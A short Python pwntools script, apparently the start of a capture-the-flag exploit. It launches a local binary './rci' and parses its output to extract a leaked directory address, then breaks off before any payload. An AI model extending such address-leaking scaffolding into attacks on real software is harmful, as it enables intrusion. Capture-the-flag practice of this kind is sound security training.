from pwn import *
context.arch = 'amd64'

p = process('./rci')

p.recvuntil('~')
addr_current_dir = p.recvuntil('Level Up !',drop=True)
addr_current_dir = addr_current_dir.split('\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08')[-2]
